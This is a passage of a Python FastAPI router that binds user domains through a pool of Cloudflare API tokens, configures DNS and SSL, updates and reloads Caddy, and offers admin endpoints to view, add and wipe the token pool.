        try:
            ok = await asyncio.to_thread(_probe_ssl, d["domain"])
        except Exception as e:
            logger.warning("recheck %s: probe raised %s", d["domain"], e)
            ok = False
        logger.info("recheck %s: ok=%s", d["domain"], ok)
        if ok:
            user_domain_mark_ssl_notified(d["id"])
            changed += 1
    return {"checked": len(domains), "marked_ok": changed}


@router.post("/domains")
async def bind_domain(
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    """Запустить привязку домена. Возвращает NS-серверы CF."""
    from database import cf_pool_get_for_user, user_domain_add
    from domain_flow import (
        CaddyReloadError, CFError, CFZoneOwnedByOtherError,
        DomainAlreadyExistsError, DomainInvalidError,
        add_domain_to_caddy_with_token, cf_add_a_record,
        cf_create_or_get_zone, cf_get_ns_servers,
        cf_set_domain_defaults, cf_set_ssl_mode,
        reload_caddy, remove_domain_from_caddy,
    )

    domain = (payload.get("domain") or "").strip().lower()
    if not domain:
        raise HTTPException(400, "domain required")
    account = cf_pool_get_for_user(user["id"])
    if not account:
        raise HTTPException(503, "CF pool empty — ask admin to add tokens")

    def _do() -> list[str]:
        zone_id = cf_create_or_get_zone(domain, account["api_token"])
        cf_add_a_record(zone_id, domain, config.DOMAIN_SERVER_IP, account["api_token"])
        cf_set_ssl_mode(zone_id, "strict", account["api_token"])
        cf_set_domain_defaults(zone_id, account["api_token"])
        ns = cf_get_ns_servers(zone_id, account["api_token"])
        add_domain_to_caddy_with_token(
            domain, config.DOMAIN_CADDYFILE,
            account["api_token"], target=config.DOMAIN_TARGET,
        )
        try:
            reload_caddy(
                config.DOMAIN_CADDY_EXE, config.DOMAIN_CADDYFILE,
                admin_url=config.DOMAIN_CADDY_ADMIN_URL or None,
            )
        except CaddyReloadError:
            try:
                remove_domain_from_caddy(domain, config.DOMAIN_CADDYFILE)
            except Exception:
                pass
            raise
        return ns

    try:
        ns = await asyncio.to_thread(_do)
    except DomainInvalidError:
        raise HTTPException(400, "invalid domain")
    except DomainAlreadyExistsError:
        raise HTTPException(409, "already bound")
    except CFZoneOwnedByOtherError:
        raise HTTPException(409, "zone owned by another CF account")
    except (CFError, CaddyReloadError) as e:
        raise HTTPException(500, str(e)[:300])

    user_domain_add(user["id"], domain, account["id"])
    return {"domain": domain, "ns_servers": ns}


# ===== admin =====

@router.get("/admin/cf-pool")
async def admin_pool_stats(user: dict = Depends(verify_panel_user)) -> dict:
    await require_admin(user)
    return cf_pool_stats()


@router.post("/admin/cf-pool")
async def admin_pool_add(
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    await require_admin(user)
    raw = (payload.get("token") or "").strip()
    if not raw:
        raise HTTPException(400, "token required")
    if not raw.isascii():
        raise HTTPException(400, "token must be ASCII")
    added = cf_pool_add(email=None, api_token=raw, label=payload.get("label"))
    try:
        from cf_pool_loader import append_token_to_json
        append_token_to_json(raw, label=payload.get("label"))
    except Exception:
        pass
    return {"added": added, **cf_pool_stats()}


@router.delete("/admin/cf-pool")
async def admin_pool_wipe(user: dict = Depends(verify_panel_user)) -> dict:
    await require_admin(user)
    removed = cf_pool_purge_all()
    return {"removed": removed, **cf_pool_stats()}
